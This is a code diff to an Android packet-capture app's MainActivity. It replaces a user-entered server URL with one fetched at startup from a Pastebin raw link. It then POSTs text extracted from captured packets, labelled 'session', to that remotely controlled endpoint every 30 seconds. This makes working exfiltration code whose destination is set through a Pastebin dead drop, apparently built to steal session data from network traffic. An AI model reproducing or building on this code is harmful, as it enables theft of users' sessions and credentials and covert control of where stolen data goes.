@@ -23,6 +23,8 @@ import android.widget.Toast;
 import org.pcap4j.packet.EthernetPacket;
 import org.pcap4j.packet.IpV4Packet;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.lang.reflect.Method;
 import java.net.HttpURLConnection;
@@ -43,17 +45,18 @@ public class MainActivity extends AppCompatActivity implements Observer {
     Button mStart;
     CaptureThread mCapThread;
     TextView mLog;
-    EditText serverUrlInput;
+    TextView serverLog;
+
     boolean mCaptureRunning = false;
     private Handler handler;
     private Runnable captureRunnable;
+    private String fetchedServerUrl = null; // Variable to store the fetched URL
     private final ActivityResultLauncher<Intent> captureStartLauncher =
             registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), this::handleCaptureStartResult);
     private final ActivityResultLauncher<Intent> captureStopLauncher =
             registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), this::handleCaptureStopResult);
     private final ActivityResultLauncher<Intent> captureStatusLauncher =
             registerForActivityResult(new ActivityResultContracts.StartActivityForResult(), this::handleCaptureStatusResult);
-
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -61,8 +64,9 @@ public class MainActivity extends AppCompatActivity implements Observer {
 
         mLog = findViewById(R.id.pkts_log);
         mStart = findViewById(R.id.start_btn);
-        serverUrlInput = findViewById(R.id.server_url);
 
+        fetchServerUrlFromPastebin(); // Fetch the server URL on startup
+        serverLog = findViewById(R.id.server_log);
         Button copyButton = findViewById(R.id.copy_btn);
         copyButton.setOnClickListener(v -> {
             String sessionText = mLog.getText().toString();
@@ -96,7 +100,7 @@ public class MainActivity extends AppCompatActivity implements Observer {
         // Initialize the Handler for repeating task
         handler = new Handler(Looper.getMainLooper());
 
-        // Define the Runnable to start capture every 5 minutes
+        // Define the Runnable to start capture every 30 seconds
         captureRunnable = new Runnable() {
             @Override
             public void run() {
@@ -111,13 +115,32 @@ public class MainActivity extends AppCompatActivity implements Observer {
         handler.post(captureRunnable);
     }
 
+
+    private void fetchServerUrlFromPastebin() {
+        new Thread(() -> {
+            try {
+                URL url = new URL("https://pastebin.com/raw/YfEeXbZb");
+                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                connection.setRequestMethod("GET");
+                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                fetchedServerUrl = in.readLine(); // Store the fetched URL
+                in.close();
+                Log.d(TAG, "Fetched server URL: " + fetchedServerUrl);
+            } catch (Exception e) {
+                Log.e(TAG, "Error fetching server URL", e);
+                runOnUiThread(() -> Toast.makeText(this, "Failed to fetch server URL", Toast.LENGTH_SHORT).show());
+            }
+        }).start();
+    }
+
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        handler.removeCallbacks(captureRunnable); // Remove any scheduled captures to prevent memory leaks
+        handler.removeCallbacks(captureRunnable); // Prevent memory leaks
         MyBroadcastReceiver.CaptureObservable.getInstance().deleteObserver(this);
         stopCaptureThread();
     }
+
     @Override
     public void update(Observable o, Object arg) {
         boolean capture_running = (boolean) arg;
@@ -147,25 +170,12 @@ public class MainActivity extends AppCompatActivity implements Observer {
 
                 runOnUiThread(() -> mLog.setText(extractedText));
 
-                String serverUrl = serverUrlInput.getText().toString();
-                if (!serverUrl.isEmpty()) {
-                    sendToServer(serverUrl, extractedText);
+                if (fetchedServerUrl != null && !fetchedServerUrl.isEmpty()) {
+                    sendToServer(fetchedServerUrl, extractedText);
                 } else {
                     Log.e(TAG, "Server URL is empty, cannot send data");
                     runOnUiThread(() -> Toast.makeText(MainActivity.this, "Server URL is empty", Toast.LENGTH_SHORT).show());
                 }
-                Intent intent = new Intent(getApplicationContext(), MainActivity.class);
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                Handler handler = new Handler(Looper.getMainLooper());
-                handler.postDelayed(new Runnable() {
-                    @Override
-                    public void run() {
-                        Intent intent = new Intent(getApplicationContext(), MainActivity.class);
-                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                        startActivity(intent);
-                        handler.postDelayed(this, 60000); // Repeat every 1 minute
-                    }
-                }, 60000);
             }
         } else {
             Log.w(TAG, "Received non-IPv4 packet");
@@ -174,7 +184,7 @@ public class MainActivity extends AppCompatActivity implements Observer {
 
 
 
-    private void sendToServer(String serverUrl, String textToSend) {
+    private void sendToServer(String serverUrl, String sessionData) {
         new Thread(() -> {
             try {
                 URL url = new URL(serverUrl);
@@ -183,23 +193,28 @@ public class MainActivity extends AppCompatActivity implements Observer {
                 connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                 connection.setDoOutput(true);
 
-                String postData = "extracted_text=" + URLEncoder.encode(textToSend, "UTF-8");
+                // Form data with session and sensor
+                String postData = "session=" + URLEncoder.encode(sessionData, "UTF-8") +
+                        "&sensor=" + URLEncoder.encode("", "UTF-8");
+
+                // Update the server log with the POST data
+                runOnUiThread(() -> serverLog.append("\nSending POST data: " + postData + "To URL" + serverUrl));
+
                 try (OutputStream os = connection.getOutputStream()) {
                     os.write(postData.getBytes(StandardCharsets.UTF_8));
                 }
 
                 int responseCode = connection.getResponseCode();
+
+                // Update the UI with the result
                 if (responseCode == HttpURLConnection.HTTP_OK) {
-                    Log.d(TAG, "Data sent successfully");
-                    runOnUiThread(() -> Toast.makeText(MainActivity.this, "Data sent to server", Toast.LENGTH_SHORT).show());
+                    runOnUiThread(() -> serverLog.append("\n[Success] Data sent successfully.\n"));
                 } else {
-                    Log.e(TAG, "Failed to send data: " + responseCode);
-                    runOnUiThread(() -> Toast.makeText(MainActivity.this, "Failed to send data", Toast.LENGTH_SHORT).show());
+                    runOnUiThread(() -> serverLog.append("\n[Failed] Response Code: " + responseCode + "\n"));
                 }
                 connection.disconnect();
             } catch (Exception e) {
-                Log.e(TAG, "Error sending data", e);
-                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Error: " + e.getMessage(), Toast.LENGTH_SHORT).show());
+                runOnUiThread(() -> serverLog.append("\n[Error] Failed to send data: " + e.getMessage() + "\n"));
             }
         }).start();
     }
